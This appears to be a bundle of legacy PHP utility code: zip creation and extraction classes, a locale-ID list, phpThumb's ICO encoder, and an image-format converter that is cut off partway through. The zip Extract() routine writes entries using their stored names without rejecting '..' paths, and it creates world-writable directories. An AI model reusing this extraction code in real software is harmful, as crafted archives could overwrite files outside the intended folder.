/**
 * Zip file creation class.
 * Makes zip files.
 *
 * Based on :
 *
 *  http://www.zend.com/codex.php?id=535&single=1
 *  By Eric Mueller <eric@themepark.com>
 *
 *  http://www.zend.com/codex.php?id=470&single=1
 *  by Denis125 <webmaster@atlant.ru>
 *
 *  a patch from Peter Listiak <mlady@users.sourceforge.net> for last modified
 *  date and time of the compressed file
 *
 * Official ZIP file format: http://www.pkware.com/appnote.txt
 *
 * @access  public
 */
class zipfile
{
    /**
     * Array to store compressed data
     *
     * @var  array    $datasec
     */
    var $datasec      = array();

    /**
     * Central directory
     *
     * @var  array    $ctrl_dir
     */
    var $ctrl_dir     = array();

    /**
     * End of central directory record
     *
     * @var  string   $eof_ctrl_dir
     */
    var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";

    /**
     * Last offset position
     *
     * @var  integer  $old_offset
     */
    var $old_offset   = 0;


    /**
     * Converts an Unix timestamp to a four byte DOS date and time format (date
     * in high two bytes, time in low two bytes allowing magnitude comparison).
     *
     * @param  integer  the current Unix timestamp
     *
     * @return integer  the current date in a four byte DOS format
     *
     * @access private
     */
    function unix2DosTime($unixtime = 0) {
        error_reporting(0);
        $timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);

        if ($timearray['year'] < 1980) {
            $timearray['year']    = 1980;
            $timearray['mon']     = 1;
            $timearray['mday']    = 1;
            $timearray['hours']   = 0;
            $timearray['minutes'] = 0;
            $timearray['seconds'] = 0;
        } // end if

        return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |
                ($timearray['hours'] << 11) | ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
    } // end of the 'unix2DosTime()' method


    /**
     * Adds "file" to archive
     *
     * @param  string   file contents
     * @param  string   name of the file in the archive (may contains the path)
     * @param  integer  the current timestamp
     *
     * @access public
     */
    function addFile($data, $name, $time = 0)
    {
        $name     = str_replace('\\', '/', $name);

        $dtime    = dechex($this->unix2DosTime($time));
        $hexdtime = '\x' . $dtime[6] . $dtime[7]
                  . '\x' . $dtime[4] . $dtime[5]
                  . '\x' . $dtime[2] . $dtime[3]
                  . '\x' . $dtime[0] . $dtime[1];
        eval('$hexdtime = "' . $hexdtime . '";');

        $fr   = "\x50\x4b\x03\x04";
        $fr   .= "\x14\x00";            // ver needed to extract
        $fr   .= "\x00\x00";            // gen purpose bit flag
        $fr   .= "\x08\x00";            // compression method
        $fr   .= $hexdtime;             // last mod time and date

        // "local file header" segment
        $unc_len = strlen($data);
        $crc     = crc32($data);
        $zdata   = gzcompress($data);
        $zdata   = substr(substr($zdata, 0, strlen($zdata) - 4), 2); // fix crc bug
        $c_len   = strlen($zdata);
        $fr      .= pack('V', $crc);             // crc32
        $fr      .= pack('V', $c_len);           // compressed filesize
        $fr      .= pack('V', $unc_len);         // uncompressed filesize
        $fr      .= pack('v', strlen($name));    // length of filename
        $fr      .= pack('v', 0);                // extra field length
        $fr      .= $name;

        // "file data" segment
        $fr .= $zdata;

        // "data descriptor" segment (optional but necessary if archive is not
        // served as file)
        // nijel(2004-10-19): this seems not to be needed at all and causes
        // problems in some cases (bug #1037737)
        //$fr .= pack('V', $crc);                 // crc32
        //$fr .= pack('V', $c_len);               // compressed filesize
        //$fr .= pack('V', $unc_len);             // uncompressed filesize

        // add this entry to array
        $this -> datasec[] = $fr;

        // now add to central directory record
        $cdrec = "\x50\x4b\x01\x02";
        $cdrec .= "\x00\x00";                // version made by
        $cdrec .= "\x14\x00";                // version needed to extract
        $cdrec .= "\x00\x00";                // gen purpose bit flag
        $cdrec .= "\x08\x00";                // compression method
        $cdrec .= $hexdtime;                 // last mod time & date
        $cdrec .= pack('V', $crc);           // crc32
        $cdrec .= pack('V', $c_len);         // compressed filesize
        $cdrec .= pack('V', $unc_len);       // uncompressed filesize
        $cdrec .= pack('v', strlen($name) ); // length of filename
        $cdrec .= pack('v', 0 );             // extra field length
        $cdrec .= pack('v', 0 );             // file comment length
        $cdrec .= pack('v', 0 );             // disk number start
        $cdrec .= pack('v', 0 );             // internal file attributes
        $cdrec .= pack('V', 32 );            // external file attributes - 'archive' bit set

        $cdrec .= pack('V', $this -> old_offset ); // relative offset of local header
        $this -> old_offset += strlen($fr);

        $cdrec .= $name;

        // optional extra field, file comment goes here
        // save to central directory
        $this -> ctrl_dir[] = $cdrec;
    } // end of the 'addFile()' method


    /**
     * Dumps out file
     *
     * @return  string  the zipped file
     *
     * @access public
     */
    function file()
    {
        $data    = implode('', $this -> datasec);
        $ctrldir = implode('', $this -> ctrl_dir);

        return
            $data .
            $ctrldir .
            $this -> eof_ctrl_dir .
            pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries "on this disk"
            pack('v', sizeof($this -> ctrl_dir)) .  // total # of entries overall
            pack('V', strlen($ctrldir)) .           // size of central dir
            pack('V', strlen($data)) .              // offset to start of central dir
            "\x00\x00";                             // .zip file comment length
    } // end of the 'file()' method

} // end of the 'zipfile' class
?>

<?php 
////////////////////////ZIP类///////////////////////////////
class zip 
{

 var $datasec, $ctrl_dir = array();
 var $eof_ctrl_dir = "\x50\x4b\x05\x06\x00\x00\x00\x00";
 var $old_offset = 0; var $dirs = Array(".");

 function get_List($zip_name)
 {
   $zip = @fopen($zip_name, 'rb');
   if(!$zip) return(0);
   $centd = $this->ReadCentralDir($zip,$zip_name);

    @rewind($zip);
    @fseek($zip, $centd['offset']);

   for ($i=0; $i<$centd['entries']; $i++)
   {
    $header = $this->ReadCentralFileHeaders($zip);
    $header['index'] = $i;$info['filename'] = $header['filename'];
    $info['stored_filename'] = $header['stored_filename'];
    $info['size'] = $header['size'];$info['compressed_size']=$header['compressed_size'];
    $info['crc'] = strtoupper(dechex( $header['crc'] ));
    $info['mtime'] = $header['mtime']; $info['comment'] = $header['comment'];
    $info['folder'] = ($header['external']==0x41FF0010||$header['external']==16)?1:0;
    $info['index'] = $header['index'];$info['status'] = $header['status'];
    $ret[]=$info; unset($header);
   }
  return $ret;
 }
 function Add($files,$compact)
 {
  if(!is_array($files[0])) $files=Array($files);

  for($i=0;$files[$i];$i++){
    $fn = $files[$i];
    if(!in_Array(dirname($fn[0]),$this->dirs))
     $this->add_Dir(dirname($fn[0]));
    if(basename1($fn[0]))
     $ret[basename1($fn[0])]=$this->add_File($fn[1],$fn[0],$compact);
  }
  return $ret;
 }

 function get_file()
 {
   $data = implode('', $this -> datasec);
   $ctrldir = implode('', $this -> ctrl_dir);

   return $data . $ctrldir . $this -> eof_ctrl_dir .
    pack('v', sizeof($this -> ctrl_dir)).pack('v', sizeof($this -> ctrl_dir)).
    pack('V', strlen($ctrldir)) . pack('V', strlen($data)) . "\x00\x00";
 }

 function add_dir($name) 
 { 
   $name = str_replace("\\", "/", $name); 
   $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 

   $fr .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $fr .= pack("v", 0 ).$name.pack("V", 0).pack("V", 0).pack("V", 0); 
   $this -> datasec[] = $fr;

   $new_offset = strlen(implode("", $this->datasec)); 

   $cdrec = "\x50\x4b\x01\x02\x00\x00\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00"; 
   $cdrec .= pack("V",0).pack("V",0).pack("V",0).pack("v", strlen($name) ); 
   $cdrec .= pack("v", 0 ).pack("v", 0 ).pack("v", 0 ).pack("v", 0 ); 
   $ext = "\xff\xff\xff\xff"; 
   $cdrec .= pack("V", 16 ).pack("V", $this -> old_offset ).$name; 

   $this -> ctrl_dir[] = $cdrec; 
   $this -> old_offset = $new_offset; 
   $this -> dirs[] = $name;
 }

 function add_File($data, $name, $compact = 1)
 {
   $name     = str_replace('\\', '/', $name);
   $dtime    = dechex($this->DosTime());

   $hexdtime = '\x' . $dtime[6] . $dtime[7].'\x'.$dtime[4] . $dtime[5]
     . '\x' . $dtime[2] . $dtime[3].'\x'.$dtime[0].$dtime[1];
   eval('$hexdtime = "' . $hexdtime . '";');

   if($compact)
   $fr = "\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00".$hexdtime;
   else $fr = "\x50\x4b\x03\x04\x0a\x00\x00\x00\x00\x00".$hexdtime;
   $unc_len = strlen($data); $crc = crc32($data);

   if($compact){
     $zdata = gzcompress($data); $c_len = strlen($zdata);
     $zdata = substr(substr($zdata, 0, strlen($zdata) - 4), 2);
   }else{
     $zdata = $data;
   }
   $c_len=strlen($zdata);
   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $fr .= pack('v', strlen($name)).pack('v', 0).$name.$zdata;

   $fr .= pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);

   $this -> datasec[] = $fr;
   $new_offset        = strlen(implode('', $this->datasec));
   if($compact)
        $cdrec = "\x50\x4b\x01\x02\x00\x00\x14\x00\x00\x00\x08\x00";
   else $cdrec = "\x50\x4b\x01\x02\x14\x00\x0a\x00\x00\x00\x00\x00";
   $cdrec .= $hexdtime.pack('V', $crc).pack('V', $c_len).pack('V', $unc_len);
   $cdrec .= pack('v', strlen($name) ).pack('v', 0 ).pack('v', 0 );
   $cdrec .= pack('v', 0 ).pack('v', 0 ).pack('V', 32 );
   $cdrec .= pack('V', $this -> old_offset );

   $this -> old_offset = $new_offset;
   $cdrec .= $name;
   $this -> ctrl_dir[] = $cdrec;
   return true;
 }

 function DosTime() {
   $timearray = getdate();
   if ($timearray['year'] < 1980) {
     $timearray['year'] = 1980; $timearray['mon'] = 1;
     $timearray['mday'] = 1; $timearray['hours'] = 0;
     $timearray['minutes'] = 0; $timearray['seconds'] = 0;
   }
   return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) |     ($timearray['mday'] << 16) | ($timearray['hours'] << 11) | 
    ($timearray['minutes'] << 5) | ($timearray['seconds'] >> 1);
 }

 function Extract ( $zn, $to, $index = Array(-1) )
 {
   $ok = 0; $zip = @fopen($zn,'rb');
   if(!$zip) return(-1);
   $cdir = $this->ReadCentralDir($zip,$zn);
   $pos_entry = $cdir['offset'];

   if(!is_array($index)){ $index = array($index);  }
   for($i=0; $index[$i];$i++){
     if(intval($index[$i])!=$index[$i]||$index[$i]>$cdir['entries'])
      return(-1);
   }

   for ($i=0; $i<$cdir['entries']; $i++)
   {
     @fseek($zip, $pos_entry);
     $header = $this->ReadCentralFileHeaders($zip);
     $header['index'] = $i; $pos_entry = ftell($zip);
     @rewind($zip); fseek($zip, $header['offset']);
     if(in_array("-1",$index)||in_array($i,$index))
      $stat[$header['filename']]=$this->ExtractFile($header, $to, $zip);
      
   }
   fclose($zip);
   return $stat;
 }

  function ReadFileHeader($zip)
  { 
    $binary_data = fread($zip, 30);
    $data = unpack('vchk/vid/vversion/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len', $binary_data);

    $header['filename'] = fread($zip, $data['filename_len']);
    if ($data['extra_len'] != 0) {
      $header['extra'] = fread($zip, $data['extra_len']);
    } else { $header['extra'] = ''; }

    $header['compression'] = $data['compression'];$header['size'] = $data['size'];
    $header['compressed_size'] = $data['compressed_size'];
    $header['crc'] = $data['crc']; $header['flag'] = $data['flag'];
    $header['mdate'] = $data['mdate'];$header['mtime'] = $data['mtime'];

    if ($header['mdate'] && $header['mtime']){
     $hour=($header['mtime']&0xF800)>>11;$minute=($header['mtime']&0x07E0)>>5;
     $seconde=($header['mtime']&0x001F)*2;$year=(($header['mdate']&0xFE00)>>9)+1980;
     $month=($header['mdate']&0x01E0)>>5;$day=$header['mdate']&0x001F;
     $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    }else{$header['mtime'] = time();}

    $header['stored_filename'] = $header['filename'];
    $header['status'] = "ok";
    return $header;
  }

 function ReadCentralFileHeaders($zip){
    $binary_data = fread($zip, 46);
    $header = unpack('vchkid/vid/vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $binary_data);

    if ($header['filename_len'] != 0)
      $header['filename'] = fread($zip,$header['filename_len']);
    else $header['filename'] = '';

    if ($header['extra_len'] != 0)
      $header['extra'] = fread($zip, $header['extra_len']);
    else $header['extra'] = '';

    if ($header['comment_len'] != 0)
      $header['comment'] = fread($zip, $header['comment_len']);
    else $header['comment'] = '';

    if ($header['mdate'] && $header['mtime'])
    {
      $hour = ($header['mtime'] & 0xF800) >> 11;
      $minute = ($header['mtime'] & 0x07E0) >> 5;
      $seconde = ($header['mtime'] & 0x001F)*2;
      $year = (($header['mdate'] & 0xFE00) >> 9) + 1980;
      $month = ($header['mdate'] & 0x01E0) >> 5;
      $day = $header['mdate'] & 0x001F;
      $header['mtime'] = mktime($hour, $minute, $seconde, $month, $day, $year);
    } else {
      $header['mtime'] = time();
    }
    $header['stored_filename'] = $header['filename'];
    $header['status'] = 'ok';
    if (substr($header['filename'], -1) == '/')
      $header['external'] = 0x41FF0010;
    return $header;
 }

 function ReadCentralDir($zip,$zip_name)
 {
  $size = filesize($zip_name);
  if ($size < 277) $maximum_size = $size;
  else $maximum_size=277;

  @fseek($zip, $size-$maximum_size);
  $pos = ftell($zip); $bytes = 0x00000000;

  while ($pos < $size)
  {
    $byte = @fread($zip, 1); $bytes=($bytes << 8) | Ord($byte);
    if ($bytes == 0x504b0506){ $pos++; break; } $pos++;
  }

 $data=unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size',fread($zip,18));


  if ($data['comment_size'] != 0)
    $centd['comment'] = fread($zip, $data['comment_size']);
    else $centd['comment'] = ''; $centd['entries'] = $data['entries'];
  $centd['disk_entries'] = $data['disk_entries'];
  $centd['offset'] = $data['offset'];$centd['disk_start'] = $data['disk_start'];
  $centd['size'] = $data['size'];  $centd['disk'] = $data['disk'];
  return $centd;
 }

 function ExtractFile($header,$to,$zip)
 {
   $header = $this->readfileheader($zip);

   if(substr($to,-1)!="/") $to.="/";
   if(!@is_dir($to)) @mkdir($to,0777);

   $pth = explode("/",dirname($header['filename']));
   for($i=0;isset($pth[$i]);$i++){
     if(!$pth[$i]) continue;$pthss.=$pth[$i]."/";
     if(!is_dir($to.$pthss)) @mkdir($to.$pthss,0777);
   }
  if (!($header['external']==0x41FF0010)&&!($header['external']==16))
  {
   if ($header['compression']==0)
   {
    $fp = @fopen($to.$header['filename'], 'wb');
    if(!$fp) return(-1);
    $size = $header['compressed_size'];

    while ($size != 0)
    {
      $read_size = ($size < 2048 ? $size : 2048);
      $buffer = fread($zip, $read_size);
      $binary_data = pack('a'.$read_size, $buffer);
      @fwrite($fp, $binary_data, $read_size);
      $size -= $read_size;
    }
    fclose($fp);
    touch($to.$header['filename'], $header['mtime']);

  }else{
   $fp = @fopen($to.$header['filename'].'.gz','wb');
   if(!$fp) return(-1);
   $binary_data = pack('va1a1Va1a1', 0x8b1f, Chr($header['compression']),
     Chr(0x00), time(), Chr(0x00), Chr(3));

   fwrite($fp, $binary_data, 10);
   $size = $header['compressed_size'];

   while ($size != 0)
   {
     $read_size = ($size < 1024 ? $size : 1024);
     $buffer = fread($zip, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }

   $binary_data = pack('VV', $header['crc'], $header['size']);
   fwrite($fp, $binary_data,8); fclose($fp);

   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compresse");
    if(!$gzp) return(-2);
   $fp = @fopen($to.$header['filename'],'wb');
   if(!$fp) return(-1);
   $size = $header['size'];

   while ($size != 0)
   {
     $read_size = ($size < 2048 ? $size : 2048);
     $buffer = gzread($gzp, $read_size);
     $binary_data = pack('a'.$read_size, $buffer);
     @fwrite($fp, $binary_data, $read_size);
     $size -= $read_size;
   }
   fclose($fp); gzclose($gzp);

   touch($to.$header['filename'], $header['mtime']);
   @unlink($to.$header['filename'].'.gz');

  }}
  return true;
 }
} //ZIP压缩类end
?>

<?php 
function LCIDS(){
?>
Afrikaans (1078)
Albanian (1052)
Arabic - U.A.E. (14337)
Arabic - Bahrain (15361)
Arabic - Algeria (5121)
Arabic - Egypt (3073)
Arabic - Iraq (2049)
Arabic - Jordan (11265)
Arabic - Kuwait (13313)
Arabic - Lebanon (12289)
Arabic - Libya (4097)
Arabic - Morocco (6145)
Arabic - Oman (8193) 
Arabic - Qatar (16385)
Arabic - Saudia Arabia (1025)
Arabic - Syria (10241)
Arabic - Tunisia (7169)
Arabic - Yemen (9217)
Basque (1069)
Belarusian (1059)
Bulgarian (1026)
Catalan (1027)
Chinese - PRC (2052)
Chinese - Hong Kong (3076)
Chinese - Singapore (4100)
Chinese - Taiwan (1028)
Croatian (1050)
Czech (1029)
Danish (1030)
Dutch (1043)
Dutch  Belgium (2067)
English - Australia (3081)
English - Belize (10249)
English - Canada (4105)
English - Ireland (6153)
English - Jamaica (8201)
English - New Zealand (5129)
English - South Africa (7177)
English - Trinidad (11273)
English - United Kingdom (2057)
English - United States (1033)
Estonian (1061)
Farsi (1065)
Finnish (1035)
Faeroese (1080)
French - Standard (1036)
French - Belgium (2060)
French - Canada (3084)
French - Luxembourg (5132)
French - Switzerland (4108)
Gaelic Scotland (1084)
German - Standard (1031)
German - Austrian (3079)
German - Lichtenstein (5127)
German - Luxembourg (4103)
German - Switzerland (2055)
Greek (1032)
Hebrew (1037)
Hindi (1081)
Hungarian (1038)
Icelandic (1039)
Indonesian (1057)
Italian Standard (1040)
Italian Switzerland (2064)
Japanese (1041)
Korean (1042)
Latvian (1062)
Lithuanian (1063)
Macedonian (1071)
Malay Malaysia (1086)
Maltese (1082)
Norwegian  Bokml (1044)
Polish (1045)
Portuguese Standard (2070)
Portuguese Brazil (1046)
RaetoRomance (1047)
Romanian (1048)
Romanian Moldova (2072)
Russian (1049)
Russian Moldova (2073)
Serbian Cyrillic (3098)
Setsuana (1074)
Slovenian (1060)
Slovak (1051)
Sorbian (1070)
Spanish - Standard (1034)
Spanish - Argentina (11274)
Spanish - Bolivia (16394)
Spanish - Chile (13322)
Spanish - Columbia (9226)
Spanish - Costa Rica (5130)
Spanish - Dominican Republic (7178)
Spanish - Ecuador (12298)
Spanish - Guatemala (4106)
Spanish - Honduras (18442)
Spanish - Mexico (2058)
Spanish - Nicaragua (19466)
Spanish - Panama (6154)
Spanish - Peru (10250)
Spanish - Puerto Rico (20490)
Spanish - Paraguay (15370)
Spanish - El Salvador (17418)
Spanish - Uruguay (14346)
Spanish - Venezuela (8202)
Sutu (1072)
Swedish (1053)
Swedish - Finland (2077)
Thai (1054)
Turkish (1055)
Tsonga (1073)
Ukranian (1058)
Urdu Pakistan (1056)
Vietnamese (1066)
Xhosa (1076)
Yiddish (1085)
Zulu (1077)
<?php 
exit;
}
?>

<?php  
////////////////////////////////////////////////////////////// 
///  phpThumb() by James Heinrich <info@silisoftware.com>   // 
//        available at http://phpthumb.sourceforge.net     /// 
////////////////////////////////////////////////////////////// 
///                                                         // 
// phpthumb.ico.php - .ICO output format functions          // 
//                                                         /// 
////////////////////////////////////////////////////////////// 
class phpthumb_ico { 
    function phpthumb_ico() { 
        return true; 
    } 
    function GD2ICOstring(&$gd_image_array) { 
        foreach ($gd_image_array as $key => $gd_image) { 
            $ImageWidths[$key]  = ImageSX($gd_image); 
            $ImageHeights[$key] = ImageSY($gd_image); 
            $bpp[$key]          = ImageIsTrueColor($gd_image) ? 32 : 24; 
            $totalcolors[$key]  = ImageColorsTotal($gd_image); 
            $icXOR[$key] = ''; 
            for ($y = $ImageHeights[$key] - 1; $y >= 0; $y--) { 
                for ($x = 0; $x < $ImageWidths[$key]; $x++) { 
                    $argb = $this->GetPixelColor($gd_image, $x, $y); 
                    $a = round(255 * ((127 - $argb['alpha']) / 127)); 
                    $r = $argb['red']; 
                    $g = $argb['green']; 
                    $b = $argb['blue']; 
                    if ($bpp[$key] == 32) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r).chr($a); 
                    } elseif ($bpp[$key] == 24) { 
                        $icXOR[$key] .= chr($b).chr($g).chr($r); 
                    } 
                    if ($a < 128) { 
                        @$icANDmask[$key][$y] .= '1'; 
                    } else { 
                        @$icANDmask[$key][$y] .= '0'; 
                    } 
                } 
                // mask bits are 32-bit aligned per scanline 
                while (strlen($icANDmask[$key][$y]) % 32) { 
                    $icANDmask[$key][$y] .= '0'; 
                } 
            } 
            $icAND[$key] = ''; 
            foreach ($icANDmask[$key] as $y => $scanlinemaskbits) { 
                for ($i = 0; $i < strlen($scanlinemaskbits); $i += 8) { 
                    $icAND[$key] .= chr(bindec(str_pad(substr($scanlinemaskbits, $i, 8), 8, '0', STR_PAD_LEFT))); 
                } 
            } 
        } 
        foreach ($gd_image_array as $key => $gd_image) { 
            $biSizeImage = $ImageWidths[$key] * $ImageHeights[$key] * ($bpp[$key] / 8); 
            // BITMAPINFOHEADER - 40 bytes 
            $BitmapInfoHeader[$key]  = ''; 
            $BitmapInfoHeader[$key] .= "\x28\x00\x00\x00";                              // DWORD  biSize; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageWidths[$key], 4);      // LONG   biWidth; 
            // The biHeight member specifies the combined 
            // height of the XOR and AND masks. 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($ImageHeights[$key] * 2, 4); // LONG   biHeight; 
            $BitmapInfoHeader[$key] .= "\x01\x00";                                      // WORD   biPlanes; 
            $BitmapInfoHeader[$key] .= chr($bpp[$key])."\x00";                          // wBitCount; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biCompression; 
            $BitmapInfoHeader[$key] .= $this->LittleEndian2String($biSizeImage, 4);            // DWORD  biSizeImage; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biXPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // LONG   biYPelsPerMeter; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrUsed; 
            $BitmapInfoHeader[$key] .= "\x00\x00\x00\x00";                              // DWORD  biClrImportant; 
        } 
        $icondata  = "\x00\x00";                                      // idReserved;   // Reserved (must be 0) 
        $icondata .= "\x01\x00";                                      // idType;       // Resource Type (1 for icons) 
        $icondata .= $this->LittleEndian2String(count($gd_image_array), 2);  // idCount;      // How many images? 
        $dwImageOffset = 6 + (count($gd_image_array) * 16); 
        foreach ($gd_image_array as $key => $gd_image) { 
            // ICONDIRENTRY   idEntries[1]; // An entry for each image (idCount of 'em) 
            $icondata .= chr($ImageWidths[$key]);                     // bWidth;          // Width, in pixels, of the image 
            $icondata .= chr($ImageHeights[$key]);                    // bHeight;         // Height, in pixels, of the image 
            $icondata .= chr($totalcolors[$key]);                     // bColorCount;     // Number of colors in image (0 if >=8bpp) 
            $icondata .= "\x00";                                      // bReserved;       // Reserved ( must be 0) 
            $icondata .= "\x01\x00";                                  // wPlanes;         // Color Planes 
            $icondata .= chr($bpp[$key])."\x00";                      // wBitCount;       // Bits per pixel 
            $dwBytesInRes = 40 + strlen($icXOR[$key]) + strlen($icAND[$key]); 
            $icondata .= $this->LittleEndian2String($dwBytesInRes, 4);       // dwBytesInRes;    // How many bytes in this resource? 
            $icondata .= $this->LittleEndian2String($dwImageOffset, 4);      // dwImageOffset;   // Where in the file is this image? 
            $dwImageOffset += strlen($BitmapInfoHeader[$key]); 
            $dwImageOffset += strlen($icXOR[$key]); 
            $dwImageOffset += strlen($icAND[$key]); 
        } 
        foreach ($gd_image_array as $key => $gd_image) { 
            $icondata .= $BitmapInfoHeader[$key]; 
            $icondata .= $icXOR[$key]; 
            $icondata .= $icAND[$key]; 
        } 
        return $icondata; 
    } 
    function LittleEndian2String($number, $minbytes=1) { 
        $intstring = ''; 
        while ($number > 0) { 
            $intstring = $intstring.chr($number & 255); 
            $number >>= 8; 
        } 
        return str_pad($intstring, $minbytes, "\x00", STR_PAD_RIGHT); 
    }
    function GetPixelColor(&$img, $x, $y) { 
        if (!is_resource($img)) { 
            return false; 
        } 
        return @ImageColorsForIndex($img, @ImageColorAt($img, $x, $y)); 
    } 
}
?>

<?php 
######
## ImageConverter
## Convert various image type that supported by PHP
## ie: JPEG, GIF, PNG, SWF, WBMP
## Version 0.9
## 15th January 2005
#######
## Author: Huda M Elmatsani
## Email :      justhuda ## netscape ## net
#######
## Copyright (c) 2005 Huda M Elmatsani All rights reserved.
## This program is free for any purpose use.
########
## Description:
## Casting image type from one type to another is useful for
## web experience, because each type has advantage and disadvantage.
## With JPEG you can reduce the quality to get affordable filesize,
## with GIF you can make it transparent or make an animation,
## with PNG you can avoid from GIF restriction,
## with SWF you can protect your image or make a movie.
## This class helps you doing this various conversion within a single line.
##
## Requirements:
## - GD Library
## - Ming Library
##
## Sintax:
## new ImageConverter( original_file, converted_file_type [, output]);
##
## note: output = 1 means the image is displayed to browser
##       output = 0 or no argument means the image is saved
##
## new ImageConverter('jakarta.png','jpg') => convert to JPEG
## new ImageConverter('jakarta.jpg','gif') => convert to GIF
## new ImageConverter('jakarta.gif','png') => convert to PNG
## new ImageConverter('jakarta.gif','swf') => convert to SWF
## 
##
## Example:
## new ImageConverter('jakarta.gif','jpg',1)
## the result is showed to the browser.
##
## new ImageConverter('aceh.png','swf');
## the result is saved to the disk with name 'aceh.swf'
##
## Limitation:
## Can not convert SWF file to other type :(
##
##########

class ImageConverter {

        var $imtype;
        var $im;
        var $imname;
        var $imconvertedtype;
        var $output;

        function imageConverter() {

                /* parse arguments */
                $numargs                = func_num_args();
                $imagefile      = func_get_arg(0);
                $convertedtype  = func_get_arg(1);
                $output                 = 0;
                if($numargs > 2) $this->output  = func_get_arg(2);

                /* ask the type of original file */
                $fileinfo               = pathinfo($imagefile);
                $imtype                 = $fileinfo["extension"];
                $this->imname   = basename($fileinfo["basename"],".".$imtype);
                $this->imtype   = $imtype;

                /* create the image variable of original file */
                switch ($imtype) {
                case "gif":
                        $this->im       =  imageCreateFromGIF($imagefile);
                        break;
                case "jpg":
                        $this->im       =  imageCreateFromJPEG($imagefile);
                        break;
                case "png":
                        $this->im       =  imageCreateFromPNG($imagefile);
                        break;
                case "wbmp":
                        $this->im       =  imageCreateFromWBMP($imagefile);
                        break;
                /*
                mail me if you have/find this functionality bellow  */
                /*
                case "swf":
                        $this->im       = $this->imageCreateFromSWF($imagefile);
                        break;
                */
                }

                /* convert to intended type */
                $this->convertImage($convertedtype);
        }

        function convertImage($type) {

                /* check the converted image type availability,
                   if it is not available, it will be casted to jpeg :) */
                $validtype = $this->validateType($type);


                if($this->output) {

                        /* show the image  */
                        switch($validtype){
                                case 'jpeg' :
                                case 'jpg'      :
                                        header("Content-type: image/jpeg");
                                        if($this->imtype == 'gif' or $this->imtype == 'png') {
                                                $image = $this->replaceTransparentWhite($this->im);
                                                imageJPEG($image);
                                        } else
                                        imageJPEG($this->im);
                                        break;
                                case 'gif' :
                                        header("Content-type: image/gif");
                                        imageGIF($this->im);
                                        break;
                                case 'png' :
                                        header("Content-type: image/png");
                                        imagePNG($this->im);
                                        break;
                                case 'wbmp' :
                                        header("Content-type: image/vnd.wap.wbmp");
                                        imageWBMP($this->im);
                                        break;
                                case 'swf' :
                                        header("Content-type: application/x-shockwave-flash");
                                        $this->imageSWF($this->im);
                                        break;
                        }

                } else {
                        /* save the image  */
                        switch($validtype){
                                case 'jpeg' :
                                case 'jpg'      :
                                        if($this->imtype == 'gif' or $this->imtype == 'png') {
                                                /* replace transparent with white */
                                                $image = $this->replaceTransparentWhite($this->im);
                                                imageJPEG($image,$this->imname.".jpg");
                                        } else
                                        imageJPEG($this->im,$this->imname.".jpg");
                                        break;
                                case 'gif' :
                                        imageGIF($this->im,$this->imname.".gif");
                                        break;
                                case 'png' :
                                        imagePNG($this->im,$this->imname.".png");
                                        break;
                                case 'wbmp' :
                                        imageWBMP($this->im,$this->imname.".wbmp");
                                        break;
                                case 'swf' :
                                        $this->imageSWF($this->im,$this->imname.".swf");
                                        break;

                        }

                }
        }

        /* convert image to SWF  */
        function imageSWF() {

                /* parse arguments */
                $numargs = func_num_args();
                $image   = func_get_arg(0);
                $swfname = "";
                if($numargs > 1) $swfname = func_get_arg(1);

                /* image must be in jpeg and
                   convert jpeg to SWFBitmap
                   can be done by buffering it */
                ob_start();
                imagejpeg($image);
                $buffimg = ob_get_contents();
                ob_end_clean();

                $img    = new SWFBitmap($buffimg);

                $w = $img->getWidth();
                $h = $img->getHeight();

                $movie = new SWFMovie();
                $movie->setDimension($w, $h);
                $movie->add($img);

                if($swfname)
                        $movie->save($swfname);
                else
                        $movie->output;

        }


        /* convert SWF to image  */
        function imageCreateFromSWF($swffile) {

                die("No SWF converter in this library");

        }

        function validateType($type) {
                /* check image type availability*/
                $is_available = FALSE;

                switch($type){
                        case 'jpeg' :
                        case 'jpg'      :
                                if(function_exists("imagejpeg"))
                                $is_available = TRUE;
                                break;
                        case 'gif' :
                                if(function_exists("imagegif"))
                                $is_available = TRUE;
                                break;
                        case 'png' :
                                if(function_exists("imagepng"))
                                $is_available = TRUE;
                                break;
                        case 'wbmp' :
                                if(function_exists("imagewbmp"))
                                $is_available = TRUE;
                                break;
                        case 'swf' :
                                if(class_exists("swfmovie"))
                                $is_available = TRUE;
                                break;
                }
                if(!$is_available && function_exists("imagejpeg")){
                        /* if not available, cast image type to jpeg*/
                        return "jpeg";
                }
                else if(!$is_available && !function_exists("imagejpeg")){
                   die("No image support in this PHP server");
                }
                else
                        return $type;
        }

        function replaceTransparentWhite($im){
                $src_w = ImageSX($im);
                $src_h = ImageSY($im);
                $backgroundimage = imagecreatetruecolor($src_w, $src_h);
